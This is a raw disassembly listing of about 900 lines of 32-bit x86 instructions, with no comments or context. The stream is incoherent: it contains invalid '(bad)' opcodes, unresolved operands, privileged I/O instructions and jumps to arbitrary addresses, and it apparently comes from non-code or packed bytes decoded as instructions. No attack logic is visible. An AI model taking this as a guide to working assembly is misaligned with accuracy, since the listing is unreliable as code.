  41cc03:	fwait
  41cc04:	or     al,BYTE PTR [ebp-0xe94f9c3]
  41cc0a:	mov    DWORD PTR [edi-0x236e159b],edi
  41cc10:	cmp    esi,DWORD PTR [edx-0xf397563]
  41cc16:	mov    eax,0x9b5a9e8c
  41cc1b:	xlat   BYTE PTR ds:[ebx]
  41cc1c:	je     0x41cc1b
  41cc1e:	pop    ds
  41cc1f:	push   es
  41cc20:	xor    dh,BYTE PTR [edx-0x31]
  41cc23:	jg     0x41cc36
  41cc25:	jae    0x41cc15
  41cc27:	fist   DWORD PTR [ebp+0x79]
  41cc2a:	js     0x41cc9c
  41cc2c:	and    ecx,edi
  41cc2e:	lahf   
  41cc2f:	mov    ebx,0x9ddd618a
  41cc34:	loopne 0x41cbf8
  41cc36:	xor    ch,BYTE PTR [ebp-0x309ecd47]
  41cc3c:	adc    BYTE PTR [ebx-0x2aa74dd],dl
  41cc42:	idiv   BYTE PTR [ebp*2+0xaec1dbc]
  41cc49:	out    0xa4,eax
  41cc4b:	popa   
  41cc4c:	inc    edi
  41cc4d:	mov    edx,0xee27cdbf
  41cc52:	cmc    
  41cc53:	dec    esp
  41cc54:	idiv   DWORD PTR [esp+ebp*1-0x17]
  41cc58:	jo     0x41ccbf
  41cc5a:	pop    esp
  41cc5b:	scas   eax,DWORD PTR es:[edi]
  41cc5c:	cdq    
  41cc5d:	mov    bh,0xf6
  41cc5f:	test   DWORD PTR [edx],0x3d608ad1
  41cc65:	jle    0x41cca2
  41cc67:	pushf  
  41cc68:	and    DWORD PTR [eax+0x75d0d295],esi
  41cc6e:	mov    bl,bh
  41cc70:	popf   
  41cc71:	lock dec esi
  41cc73:	inc    ebx
  41cc74:	xor    eax,0x73db0908
  41cc79:	(bad)  
  41cc7b:	jns    0x41cc0f
  41cc7d:	mov    bh,BYTE PTR [edi+eiz*2]
  41cc80:	aam    0x4f
  41cc82:	bound  edi,QWORD PTR [eax+0x2fe3da39]
  41cc88:	push   ebp
  41cc89:	mov    esi,DWORD PTR [esi+0x45472290]
  41cc8f:	aad    0xd4
  41cc91:	jne    0x41ccad
  41cc93:	push   0x2b
  41cc95:	retf   
  41cc96:	pop    es
  41cc97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc98:	fisttp WORD PTR [eax+eiz*4]
  41cc9b:	mov    al,0xe2
  41cc9d:	aaa    
  41cc9e:	fs add al,0x9b
  41cca1:	xchg   edi,eax
  41cca2:	pop    edi
  41cca3:	inc    ebx
  41cca4:	test   bl,ah
  41cca6:	sub    BYTE PTR [ecx+0x9c33f5e],ch
  41ccac:	add    ecx,ebx
  41ccae:	mov    ebp,0x6976f2b3
  41ccb3:	fwait
  41ccb4:	test   BYTE PTR [ecx+0xe386f83],0x2e
  41ccbb:	pushf  
  41ccbc:	lods   al,BYTE PTR ds:[esi]
  41ccbd:	fistp  WORD PTR [ecx+0x664cb995]
  41ccc3:	sbb    BYTE PTR [ecx-0x45],bl
  41ccc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ccc7:	or     bl,dh
  41ccc9:	rol    BYTE PTR [edx+0x621ccee1],0xe3
  41ccd0:	call   0x67f83a18
  41ccd5:	pop    edx
  41ccd6:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41ccd8:	and    ch,BYTE PTR ds:0xbcf884cd
  41ccde:	std    
  41ccdf:	ss pop edi
  41cce1:	and    bh,BYTE PTR ds:0x767c32c7
  41cce7:	xchg   dh,cl
  41cce9:	lar    edx,si
  41ccec:	or     BYTE PTR [esi],al
  41ccee:	sub    eax,edx
  41ccf0:	push   ss
  41ccf1:	les    ecx,FWORD PTR [edx+0x51]
  41ccf4:	mov    bh,0x46
  41ccf6:	jmp    0xfb74:0xf7366ee0
  41ccfd:	sub    ah,BYTE PTR [ecx+0xd]
  41cd00:	or     dh,cl
  41cd02:	mov    ebp,DWORD PTR [ebp-0x4e]
  41cd05:	mov    ds:0x404dc794,eax
  41cd0a:	setbe  cl
  41cd0d:	add    edi,DWORD PTR [eax-0x59]
  41cd10:	pop    edx
  41cd11:	js     0x41cd8f
  41cd13:	pop    ss
  41cd14:	mov    ebx,0xd5de821f
  41cd19:	sub    eax,0x4325035
  41cd1e:	stos   BYTE PTR es:[edi],al
  41cd1f:	lods   al,BYTE PTR ds:[esi]
  41cd20:	push   0xffffff95
  41cd22:	popf   
  41cd23:	xchg   DWORD PTR [edx],edi
  41cd25:	rcr    ch,cl
  41cd27:	push   cx
  41cd29:	sub    ebx,DWORD PTR [eax+ecx*2-0x2910ba8c]
  41cd30:	into   
  41cd31:	add    dh,BYTE PTR [edx-0x3b]
  41cd34:	ror    DWORD PTR [ecx-0x6701d947],1
  41cd3a:	sbb    ah,BYTE PTR [ecx]
  41cd3c:	pop    edx
  41cd3d:	xchg   ebx,eax
  41cd3e:	gs int 0xff
  41cd41:	gs cs ds push ebx
  41cd45:	stos   BYTE PTR es:[edi],al
  41cd46:	mov    bl,0xd7
  41cd48:	mov    eax,0x334ab112
  41cd4d:	mov    edx,0x8e8f0645
  41cd52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd53:	dec    edi
  41cd54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd55:	das    
  41cd56:	jp     0x41cd91
  41cd58:	mov    dh,0x4e
  41cd5a:	je     0x41cdc2
  41cd5c:	ja     0x41cdc6
  41cd5e:	mov    al,0xb5
  41cd60:	xor    cl,BYTE PTR [eax]
  41cd62:	mov    dh,BYTE PTR [esi-0x47]
  41cd65:	pop    esi
  41cd66:	icebp  
  41cd67:	add    eax,esp
  41cd69:	repz (bad) 
  41cd6b:	pop    edi
  41cd6c:	cmp    BYTE PTR [eax+0x6bc5955a],0x87
  41cd73:	loopne 0x41cd42
  41cd75:	out    0x31,eax
  41cd77:	pop    ds
  41cd78:	and    al,0x90
  41cd7a:	inc    eax
  41cd7b:	lods   al,BYTE PTR ds:[esi]
  41cd7c:	mov    dl,0x47
  41cd7e:	pusha  
  41cd7f:	lock and DWORD PTR [edx],edi
  41cd82:	and    DWORD PTR [ebx-0x24789f66],esp
  41cd88:	add    edx,DWORD PTR [esi+ebp*2+0x34]
  41cd8c:	pop    ebx
  41cd8d:	jns    0x41cd15
  41cd8f:	aas    
  41cd90:	dec    edx
  41cd91:	sahf   
  41cd92:	add    ecx,DWORD PTR ds:0x9f4907bc
  41cd98:	ins    DWORD PTR es:[edi],dx
  41cd99:	in     eax,0x1c
  41cd9b:	mov    ?,WORD PTR [esi*8-0x6aab3282]
  41cda2:	loope  0x41cdaa
  41cda4:	outs   dx,BYTE PTR ds:[esi]
  41cda5:	fdivr  DWORD PTR [ebx]
  41cda7:	cdq    
  41cda8:	xchg   ecx,ecx
  41cdaa:	sub    edi,DWORD PTR [ebp-0x40]
  41cdad:	popa   
  41cdae:	sub    DWORD PTR [ebp-0x1c],ecx
  41cdb1:	lods   eax,DWORD PTR ds:[esi]
  41cdb2:	dec    ecx
  41cdb3:	aam    0xa2
  41cdb5:	add    al,BYTE PTR [edi+0xf10f0cc]
  41cdbb:	adc    al,0xeb
  41cdbd:	xchg   edx,eax
  41cdbe:	stc    
  41cdbf:	outs   dx,DWORD PTR ds:[esi]
  41cdc0:	in     al,0xc6
  41cdc2:	loope  0x41cd91
  41cdc4:	sbb    DWORD PTR [edx],esi
  41cdc6:	adc    dl,BYTE PTR [ecx+0x2ae24399]
  41cdcc:	cwde   
  41cdcd:	test   DWORD PTR [edi],eax
  41cdcf:	cmp    ebx,DWORD PTR [esi-0x74365dec]
  41cdd5:	enter  0x91f1,0xf9
  41cdd9:	jecxz  0x41ce28
  41cddb:	jae    0x41cd6b
  41cddd:	aas    
  41cdde:	and    BYTE PTR [edi-0x1c],0x46
  41cde2:	mov    ebp,0xd2e2630d
  41cde7:	not    BYTE PTR [ebx+0x5270813f]
  41cded:	stc    
  41cdee:	popa   
  41cdef:	mov    ds:0x19259325,eax
  41cdf4:	add    eax,0x2608883a
  41cdf9:	push   edx
  41cdfa:	in     al,0x4c
  41cdfc:	mov    BYTE PTR [esi],dh
  41cdfe:	inc    edx
  41cdff:	jmp    DWORD PTR ds:0xd982a0e9
  41ce05:	aas    
  41ce06:	les    ebx,FWORD PTR [edx+0x4db9b7f2]
  41ce0c:	rol    DWORD PTR [ecx-0x7dd7f421],0xd2
  41ce13:	ror    cl,cl
  41ce15:	lahf   
  41ce16:	pushf  
  41ce17:	mov    al,0xee
  41ce19:	stc    
  41ce1a:	pusha  
  41ce1b:	xlat   BYTE PTR ds:[ebx]
  41ce1c:	or     al,0x1a
  41ce1e:	rcl    BYTE PTR [edx],0x6a
  41ce21:	and    BYTE PTR [edx+0x67594aec],dh
  41ce27:	mov    ?,ecx
  41ce29:	aas    
  41ce2a:	mov    edx,0x6d753a1
  41ce2f:	lds    eax,FWORD PTR [esi+0x7d]
  41ce32:	mov    ds:0xbcdbbc39,al
  41ce37:	cld    
  41ce38:	faddp  st(6),st
  41ce3a:	call   DWORD PTR [ebp+0x64]
  41ce3d:	adc    eax,0x46d9598
  41ce42:	outs   dx,BYTE PTR ds:[esi]
  41ce43:	ins    BYTE PTR es:[edi],dx
  41ce44:	pop    ecx
  41ce45:	mov    edx,0xad507fd2
  41ce4a:	inc    ebx
  41ce4b:	shr    ebp,1
  41ce4d:	push   es
  41ce4e:	mov    DWORD PTR [ebp-0x7e622bf],0xf4ac066f
  41ce58:	cs push ebx
  41ce5a:	mov    ds:0x7ce854cc,al
  41ce5f:	ins    BYTE PTR es:[edi],dx
  41ce60:	ins    DWORD PTR es:[edi],dx
  41ce61:	mov    eax,ds:0x789071bc
  41ce66:	fdivr  QWORD PTR [eax+0x47]
  41ce69:	cmp    eax,0xcd27ad54
  41ce6e:	fs cs loope 0x41cea1
  41ce72:	xor    DWORD PTR [ebp+0x6111ea24],ecx
  41ce78:	add    eax,0x56e6e227
  41ce7d:	adc    al,0x97
  41ce7f:	jne    0x41cec8
  41ce81:	adc    BYTE PTR [edx+0x15],0x32
  41ce85:	nop
  41ce86:	add    eax,0x924efc09
  41ce8b:	cs pop ecx
  41ce8d:	mov    ah,0x2a
  41ce8f:	push   ss
  41ce90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce91:	nop
  41ce92:	cmp    BYTE PTR [esi],0x71
  41ce95:	mov    bh,0x2e
  41ce97:	jb     0x41ced1
  41ce99:	popf   
  41ce9a:	sbb    edx,DWORD PTR ds:0x2cac0cc7
  41cea0:	mov    eax,0x312661e1
  41cea5:	out    0xec,al
  41cea7:	dec    ecx
  41cea8:	push   ss
  41cea9:	jbe    0x41ce7b
  41ceab:	jmp    0xee006fd4
  41ceb0:	sar    DWORD PTR [edi],1
  41ceb2:	lea    ebp,[edx]
  41ceb4:	outs   dx,DWORD PTR ds:[esi]
  41ceb5:	into   
  41ceb6:	xchg   BYTE PTR [edi-0x45],dh
  41ceb9:	add    esp,DWORD PTR [esp+edx*1-0x3b22c644]
  41cec0:	push   edx
  41cec1:	hlt    
  41cec2:	(bad)  
  41cec4:	mov    WORD PTR [esi-0x52],?
  41cec7:	mov    dh,0x70
  41cec9:	add    eax,0x6f379c9e
  41cece:	dec    edi
  41cecf:	aaa    
  41ced0:	sub    al,0x7a
  41ced2:	ins    DWORD PTR es:[edi],dx
  41ced3:	lahf   
  41ced4:	scas   al,BYTE PTR es:[edi]
  41ced5:	adc    DWORD PTR [edi],ebx
  41ced7:	dec    eax
  41ced8:	xchg   esp,eax
  41ced9:	fxch   st(2)
  41cedb:	cmp    dh,BYTE PTR [eax+0x65]
  41cede:	repnz in al,dx
  41cee0:	xchg   DWORD PTR [ecx-0x42a63496],ecx
  41cee6:	jmp    0x41cee5
  41cee8:	mov    bl,0xa0
  41ceea:	mov    edx,0x8664e394
  41ceef:	push   esp
  41cef0:	mov    eax,0xf3156783
  41cef5:	mov    ds:0xbcb0eede,eax
  41cefa:	dec    ebp
  41cefb:	mov    dl,0xbf
  41cefd:	and    edi,DWORD PTR [eax+0x57]
  41cf00:	aas    
  41cf01:	jecxz  0x41cf5e
  41cf03:	enter  0x71ec,0x79
  41cf07:	mov    esp,0x344b6893
  41cf0c:	pop    edi
  41cf0d:	cmp    DWORD PTR [eax],ebx
  41cf0f:	dec    ebx
  41cf10:	xchg   esi,eax
  41cf11:	rcr    DWORD PTR [ecx+0x1ee2bee6],1
  41cf17:	inc    esp
  41cf18:	adc    al,0xd7
  41cf1a:	daa    
  41cf1b:	push   esi
  41cf1c:	inc    ebp
  41cf1d:	retf   
  41cf1e:	(bad)  
  41cf1f:	inc    ebx
  41cf20:	mov    ebp,0xa0108956
  41cf25:	retf   
  41cf26:	push   edi
  41cf27:	loop   0x41cf1c
  41cf29:	jb     0x41cf19
  41cf2b:	pop    es
  41cf2c:	jnp    0x41cec3
  41cf2e:	es scas eax,DWORD PTR es:[edi]
  41cf30:	and    al,0xa5
  41cf32:	mov    ebx,DWORD PTR ds:0x272467a5
  41cf38:	mov    cl,0xbc
  41cf3a:	lea    eax,[ebp+edi*2-0x791edc4d]
  41cf41:	fisub  WORD PTR [ebx+0xb]
  41cf44:	(bad)  
  41cf45:	fnop   
  41cf47:	stos   BYTE PTR es:[edi],al
  41cf48:	adc    BYTE PTR [esi],dh
  41cf4a:	outs   dx,DWORD PTR ds:[esi]
  41cf4b:	leave  
  41cf4c:	aas    
  41cf4d:	jl     0x41cf30
  41cf4f:	xchg   edi,eax
  41cf50:	retf   0xae04
  41cf53:	in     al,dx
  41cf54:	and    dh,BYTE PTR [edi-0x42]
  41cf57:	hlt    
  41cf58:	mov    ebx,0x50c075a8
  41cf5d:	and    BYTE PTR gs:[edi+0x25687de8],0x8a
  41cf65:	mov    cl,0x29
  41cf67:	imul   esi,DWORD PTR [edi],0xfcb5992f
  41cf6d:	leave  
  41cf6e:	pop    ss
  41cf6f:	fnclex 
  41cf71:	bound  esp,QWORD PTR [eax+ebx*4]
  41cf74:	cmp    DWORD PTR [ebp-0x7719218d],edi
  41cf7a:	mov    esi,0x851159e5
  41cf7f:	fstp   QWORD PTR [esi-0x43]
  41cf82:	les    edx,FWORD PTR [esp+ebp*1+0x3c]
  41cf86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf87:	jns    0x41cfc2
  41cf89:	cmp    dl,ch
  41cf8b:	mov    BYTE PTR [ecx],0xdc
  41cf8e:	mov    ebx,0x3cd101f1
  41cf93:	pushf  
  41cf94:	push   0xd1d4a801
  41cf99:	and    edi,DWORD PTR [ecx]
  41cf9b:	(bad)  
  41cf9d:	(bad)  
  41cf9e:	adc    al,0x9f
  41cfa0:	xchg   ebp,eax
  41cfa1:	stos   BYTE PTR es:[edi],al
  41cfa2:	mov    cl,BYTE PTR [edi-0x1e3af919]
  41cfa8:	cmp    BYTE PTR [esp+esi*4-0x3b77ae96],0x2e
  41cfb0:	icebp  
  41cfb1:	std    
  41cfb2:	mov    ds:0xb7f99ba2,al
  41cfb7:	jnp    0x41cfe1
  41cfb9:	sub    BYTE PTR [esi],ah
  41cfbb:	inc    edx
  41cfbc:	(bad)  
  41cfbd:	fwait
  41cfbe:	sahf   
  41cfbf:	into   
  41cfc0:	gs loop 0x41cf57
  41cfc3:	push   es
  41cfc4:	pop    ds
  41cfc5:	lahf   
  41cfc6:	arpl   WORD PTR [edx-0x74849a6a],bx
  41cfcc:	clc    
  41cfcd:	dec    ebx
  41cfce:	mov    ds:0x3d8ad699,eax
  41cfd3:	cmp    al,0x8a
  41cfd5:	imul   edx,DWORD PTR [ebx+0x2bfe57cf],0xffffffb0
  41cfdc:	scas   al,BYTE PTR es:[edi]
  41cfdd:	and    edx,DWORD PTR ds:0xbd3692b8
  41cfe3:	or     bh,0x66
  41cfe6:	lods   eax,DWORD PTR ds:[esi]
  41cfe7:	aam    0x60
  41cfe9:	push   ds
  41cfea:	cmp    ch,BYTE PTR [ebx+0x40cafbf]
  41cff0:	xor    edi,DWORD PTR ds:0x54e72993
  41cff6:	push   ds
  41cff7:	dec    ecx
  41cff8:	or     BYTE PTR [edx-0xf],bh
  41cffb:	pop    edi
  41cffc:	add    esi,esi
  41cffe:	cld    
  41cfff:	add    ch,BYTE PTR [eax]
  41d001:	imul   DWORD PTR [eax+0x4655ddc7]
  41d007:	mov    fs,edi
  41d009:	inc    eax
  41d00a:	bound  ebp,QWORD PTR [ebp+ebx*2+0x842ef33]
  41d011:	sbb    DWORD PTR [esi-0x57],esp
  41d014:	daa    
  41d015:	sahf   
  41d016:	cmp    eax,0x2732ddfa
  41d01b:	lahf   
  41d01c:	add    esi,ebp
  41d01e:	pop    es
  41d01f:	pop    edi
  41d020:	mov    esp,0xec66ccaa
  41d025:	int3   
  41d026:	scas   al,BYTE PTR es:[edi]
  41d027:	adc    edx,ebp
  41d029:	imul   edx,DWORD PTR ds:[ecx],0x6a
  41d02d:	pop    esi
  41d02e:	popa   
  41d02f:	repnz xchg ecx,eax
  41d031:	xor    esi,DWORD PTR [ebx]
  41d033:	xor    al,0xc4
  41d035:	cmp    DWORD PTR [edx+edx*1-0x72166f8b],edi
  41d03c:	inc    esi
  41d03d:	sbb    al,0x70
  41d03f:	mov    dh,0x14
  41d041:	push   cs
  41d042:	mov    bh,BYTE PTR [edx-0x3d17c48d]
  41d048:	and    eax,0x1c2bbe1
  41d04d:	sub    ch,BYTE PTR [ebx]
  41d04f:	shr    BYTE PTR [ebp+0x61],0xde
  41d053:	sbb    al,0x21
  41d055:	ror    BYTE PTR [ecx+0x2d],0x49
  41d059:	pop    ds
  41d05a:	dec    esp
  41d05b:	inc    DWORD PTR [ebx]
  41d05d:	stos   BYTE PTR es:[edi],al
  41d05e:	add    esi,DWORD PTR [edi]
  41d060:	int3   
  41d061:	xchg   esp,eax
  41d062:	adc    edi,DWORD PTR [ecx-0x79586499]
  41d068:	(bad)  
  41d069:	mov    ah,0x7b
  41d06b:	lds    ecx,FWORD PTR [edi-0x77]
  41d06e:	test   DWORD PTR [ecx],ecx
  41d070:	(bad)  
  41d071:	push   ss
  41d072:	push   edi
  41d073:	cmp    ah,BYTE PTR [ecx-0x5a156310]
  41d079:	mov    al,ds:0x82218b40
  41d07e:	adc    al,0x21
  41d080:	and    esi,esp
  41d082:	xor    eax,edi
  41d084:	jb     0x41d072
  41d086:	mov    esp,edi
  41d088:	loope  0x41d01a
  41d08a:	scas   al,BYTE PTR es:[edi]
  41d08b:	mov    ebx,0xe89b3537
  41d090:	(bad)  
  41d092:	jp     0x41d0da
  41d094:	push   ebx
  41d095:	cmp    BYTE PTR [ebx+0x22],ch
  41d098:	loop   0x41d02c
  41d09a:	mov    ch,0x59
  41d09c:	(bad)  
  41d09d:	mov    cs,esi
  41d09f:	cmp    eax,0x9f397c9b
  41d0a4:	sbb    eax,0x12009ea9
  41d0a9:	hlt    
  41d0aa:	push   0xffffffe5
  41d0ac:	cmp    eax,0x32d2c76d
  41d0b1:	push   ss
  41d0b2:	lds    ecx,FWORD PTR [ecx]
  41d0b4:	and    esi,DWORD PTR [edi+0x34800996]
  41d0ba:	or     esp,0xf58fcabf
  41d0c0:	adc    ebp,esi
  41d0c2:	sti    
  41d0c3:	and    eax,0x5a7d7bb0
  41d0c8:	shr    DWORD PTR [esp+ecx*4],cl
  41d0cb:	sti    
  41d0cc:	pop    ss
  41d0cd:	mov    eax,0x1304fb21
  41d0d2:	enter  0x960c,0xac
  41d0d6:	xor    esi,DWORD PTR [edi+0x65eb1778]
  41d0dc:	stos   DWORD PTR es:[edi],eax
  41d0dd:	jmp    0x264225c1
  41d0e2:	or     BYTE PTR [eax],0xb8
  41d0e5:	or     BYTE PTR [ebp+0x629a5429],dl
  41d0eb:	pop    ebx
  41d0ec:	or     ebp,DWORD PTR [ebx+0x10]
  41d0ef:	xor    al,BYTE PTR [eax]
  41d0f1:	ficomp DWORD PTR [edi-0x7637329e]
  41d0f7:	in     eax,0xda
  41d0f9:	pusha  
  41d0fa:	pop    ss
  41d0fb:	jmp    0x41d0b3
  41d0fd:	xlat   BYTE PTR ds:[ebx]
  41d0fe:	(bad)  
  41d0ff:	mov    cl,0x6c
  41d101:	and    ebx,esi
  41d103:	stos   BYTE PTR es:[edi],al
  41d104:	popa   
  41d105:	inc    ecx
  41d106:	xchg   ebp,eax
  41d107:	pop    eax
  41d108:	fs enter 0x4ebd,0x86
  41d10d:	sub    esp,esp
  41d10f:	xsavec [eax]
  41d112:	push   esp
  41d113:	mov    edi,cs
  41d115:	retf   
  41d116:	pop    ebx
  41d117:	scas   al,BYTE PTR es:[edi]
  41d118:	push   edx
  41d119:	push   esp
  41d11a:	popa   
  41d11b:	push   esp
  41d11c:	and    dl,BYTE PTR fs:[edi]
  41d11f:	xchg   BYTE PTR [eax+0x1088de4f],bh
  41d125:	mov    edi,0x13d0a0f2
  41d12a:	push   cs
  41d12b:	mov    ch,0x34
  41d12d:	fdivr  QWORD PTR [esi+0x35]
  41d130:	mov    ch,0x3c
  41d132:	add    DWORD PTR [ebx],0xac70971a
  41d138:	aaa    
  41d139:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d13a:	cmp    eax,0x489ca39c
  41d13f:	cdq    
  41d140:	int    0xdb
  41d142:	or     DWORD PTR [ecx],ebp
  41d144:	pop    ebp
  41d145:	repnz xor ch,BYTE PTR [eax+0x4910e220]
  41d14c:	je     0x41d12b
  41d14e:	dec    esi
  41d14f:	pusha  
  41d150:	lds    ebp,FWORD PTR [eax+0x741fea1b]
  41d156:	dec    edi
  41d157:	mov    BYTE PTR [ebx],bh
  41d159:	in     eax,0x9f
  41d15b:	mov    BYTE PTR [eax+0x68],al
  41d15e:	or     DWORD PTR [ebp+esi*2-0x6c5f9092],0xc8f7de41
  41d169:	fistp  QWORD PTR [ecx-0x7f]
  41d16c:	jmp    0x41d14a
  41d16e:	mov    ds:0x53effa3f,eax
  41d173:	(bad)  
  41d174:	pop    edx
  41d175:	pop    ds
  41d176:	add    eax,edx
  41d178:	mov    ecx,0x7dbb1b3e
  41d17d:	test   eax,0x883e4871
  41d182:	ss pop ecx
  41d184:	test   DWORD PTR [ebx],ebp
  41d186:	mov    WORD PTR [ebx],es
  41d188:	fdivrp st(2),st
  41d18a:	push   esi
  41d18b:	sbb    edi,DWORD PTR [edx-0x4c373f8a]
  41d191:	lods   eax,DWORD PTR ds:[esi]
  41d192:	mov    eax,ds:0xab5f582b
  41d197:	xor    dh,0xdc
  41d19a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d19b:	clc    
  41d19c:	inc    edi
  41d19d:	xor    BYTE PTR [ebp+ecx*4-0x7f],ah
  41d1a1:	push   esi
  41d1a2:	mov    esp,0x3bb104cd
  41d1a7:	xor    al,0x33
  41d1a9:	or     al,0x34
  41d1ab:	cli    
  41d1ac:	push   ebp
  41d1ad:	aaa    
  41d1ae:	mov    al,0x7d
  41d1b0:	sti    
  41d1b1:	loop   0x41d13c
  41d1b3:	std    
  41d1b4:	data16 adc BYTE PTR ds:0x650e5c74,0x69
  41d1bc:	ins    BYTE PTR es:[edi],dx
  41d1bd:	xchg   ecx,eax
  41d1be:	imul   ebx,DWORD PTR [ebp-0x5477bc67],0xffffffe5
  41d1c5:	test   BYTE PTR [ecx+0x50],cl
  41d1c8:	pop    eax
  41d1c9:	sahf   
  41d1ca:	cdq    
  41d1cb:	pop    ecx
  41d1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1cd:	inc    ebx
  41d1ce:	out    dx,al
  41d1cf:	xor    BYTE PTR [ebp+edi*1-0x10edda2d],ch
  41d1d6:	mov    BYTE PTR [bp+si],dl
  41d1d9:	je     0x41d18b
  41d1db:	mov    BYTE PTR [edi-0x69],cl
  41d1de:	cmp    BYTE PTR [ebx],0x2a
  41d1e1:	pop    edx
  41d1e2:	addr16 imul ebx,ebp,0x9573c7a2
  41d1e9:	aas    
  41d1ea:	test   cl,ch
  41d1ec:	sar    DWORD PTR [eax],0x4e
  41d1ef:	inc    eax
  41d1f0:	add    BYTE PTR [ebx+0x1d806f90],dh
  41d1f6:	(bad)  
  41d1f7:	loopne 0x41d1ee
  41d1f9:	mov    ds:0xcfe0072e,al
  41d1fe:	pop    ss
  41d1ff:	mov    ds:0x24b1f122,al
  41d204:	or     al,0x72
  41d206:	gs dec edx
  41d208:	test   DWORD PTR [ebx-0x7512973e],ecx
  41d20e:	mov    ebx,0x93cb3dcb
  41d213:	pop    es
  41d214:	push   0xce41cf11
  41d219:	sub    ecx,DWORD PTR [esi+0x28]
  41d21c:	pop    ds
  41d21d:	dec    ecx
  41d21e:	xchg   edx,eax
  41d21f:	imul   edx,ebp,0xffffffb4
  41d222:	or     BYTE PTR [edx-0xf9ba79a],dl
  41d228:	les    edi,FWORD PTR [ecx+0x6]
  41d22b:	cmp    DWORD PTR [edi+0xf4c1c9c],0x4d
  41d232:	fstp   QWORD PTR [eax+0x57c02bd5]
  41d238:	dec    esi
  41d239:	sbb    eax,0x944c67b7
  41d23e:	adc    ah,BYTE PTR [eax]
  41d240:	or     bh,bl
  41d242:	test   dl,ch
  41d244:	aas    
  41d245:	sbb    dl,cl
  41d247:	and    BYTE PTR [esi],dh
  41d249:	iret   
  41d24a:	es test eax,0x4bb7f183
  41d250:	xchg   BYTE PTR [edx-0x1f3e66c1],dh
  41d256:	dec    ecx
  41d257:	cld    
  41d258:	imul   ecx,DWORD PTR [ebx-0x3d],0x72e5f616
  41d25f:	mov    bh,0x70
  41d261:	in     al,dx
  41d262:	sbb    ebp,ebp
  41d264:	inc    esp
  41d265:	mov    ds:0xdf2c78f2,eax
  41d26a:	bound  ecx,QWORD PTR [edi+0x4e]
  41d26d:	sub    ch,dl
  41d26f:	test   edi,esi
  41d271:	adc    DWORD PTR [ecx-0xfa00869],edx
  41d277:	clc    
  41d278:	iret   
  41d279:	xlat   BYTE PTR ds:[ebx]
  41d27a:	jg     0x41d291
  41d27c:	sar    cl,cl
  41d27e:	xor    al,0x71
  41d280:	loopne 0x41d2d3
  41d282:	sub    dl,BYTE PTR [ecx+0x1e502078]
  41d288:	bound  eax,QWORD PTR [edi]
  41d28a:	fild   DWORD PTR [ebp+0x714b7ac0]
  41d290:	or     DWORD PTR [edx+0x5],eax
  41d293:	dec    eax
  41d294:	and    edi,eax
  41d296:	push   edx
  41d297:	push   0x8f436535
  41d29c:	inc    ecx
  41d29d:	mov    ebp,DWORD PTR [ecx]
  41d29f:	push   edx
  41d2a0:	push   esp
  41d2a1:	add    ebx,eax
  41d2a3:	sbb    al,0x9
  41d2a5:	xor    eax,0x45fcfeff
  41d2aa:	imul   eax,esi,0x778ef7b4
  41d2b0:	call   0x4ba:0xb05c121b
  41d2b7:	out    0x15,al
  41d2b9:	mov    cl,0xa2
  41d2bb:	sbb    edi,DWORD PTR [eax+eax*4-0x7ba209d7]
  41d2c2:	loopne 0x41d2eb
  41d2c4:	inc    ecx
  41d2c5:	and    BYTE PTR [edi],bl
  41d2c7:	sub    al,0x31
  41d2c9:	mov    gs,WORD PTR [ebx-0x7a]
  41d2cc:	lods   eax,DWORD PTR ds:[esi]
  41d2cd:	jmp    0xa744800d
  41d2d2:	dec    edi
  41d2d3:	pushf  
  41d2d4:	daa    
  41d2d5:	or     al,0xfb
  41d2d7:	cs (bad) 
  41d2d9:	pop    ss
  41d2da:	or     eax,0x8981f89e
  41d2df:	call   0x3bb4c87
  41d2e4:	xchg   BYTE PTR ds:0xbd7a9ff9,ah
  41d2ea:	mov    ch,0xb7
  41d2ec:	add    DWORD PTR [edi],esi
  41d2ee:	clc    
  41d2ef:	push   ss
  41d2f0:	xchg   ebx,esp
  41d2f2:	in     al,dx
  41d2f3:	adc    eax,0x3684f53c
  41d2f8:	add    al,BYTE PTR [edx+0x7468f059]
  41d2fe:	ins    DWORD PTR es:[edi],dx
  41d2ff:	inc    eax
  41d300:	sahf   
  41d301:	lods   al,BYTE PTR ds:[esi]
  41d302:	pop    edx
  41d303:	sbb    DWORD PTR [ebp+0x4a],esi
  41d306:	xchg   esi,esp
  41d308:	mov    cl,0x89
  41d30a:	in     eax,dx
  41d30b:	iret   
  41d30c:	in     eax,0xc2
  41d30e:	xlat   BYTE PTR ds:[ebx]
  41d310:	pop    edx
  41d311:	jmp    0xf028:0x13d1d416
  41d318:	xor    al,0xb
  41d31a:	(bad)  
  41d31c:	xchg   esi,eax
  41d31d:	mov    al,ds:0xa0875d44
  41d322:	ficom  DWORD PTR [ecx+eax*1]
  41d325:	fdiv   QWORD PTR [edx]
  41d327:	ds push es
  41d329:	sbb    DWORD PTR [esi+0x55],ebp
  41d32c:	sti    
  41d32d:	retf   
  41d32e:	loope  0x41d358
  41d330:	mov    eax,DWORD PTR [ebx-0x7f]
  41d333:	push   cs
  41d334:	pop    ebp
  41d335:	dec    ebx
  41d336:	cmc    
  41d337:	push   ebx
  41d338:	pop    ebx
  41d339:	fwait
  41d33a:	scas   eax,DWORD PTR es:[edi]
  41d33b:	mov    bl,0xc3
  41d33d:	xor    bl,BYTE PTR [ecx+0x13fc3782]
  41d343:	push   esp
  41d344:	xor    al,0xe3
  41d346:	imul   BYTE PTR [eax+0x20]
  41d349:	sub    ch,BYTE PTR [edx]
  41d34b:	adc    ch,BYTE PTR [edx-0x50421dfc]
  41d351:	frstor [esi]
  41d353:	ja     0x41d304
  41d355:	(bad)  
  41d357:	sti    
  41d358:	pop    es
  41d359:	stos   DWORD PTR es:[edi],eax
  41d35a:	cmp    eax,0x14672210
  41d35f:	adc    dl,BYTE PTR [ebp-0x19dc2b50]
  41d365:	ins    BYTE PTR es:[edi],dx
  41d366:	mov    ?,ebx
  41d368:	jo     0x41d3a7
  41d36a:	cwde   
  41d36b:	aas    
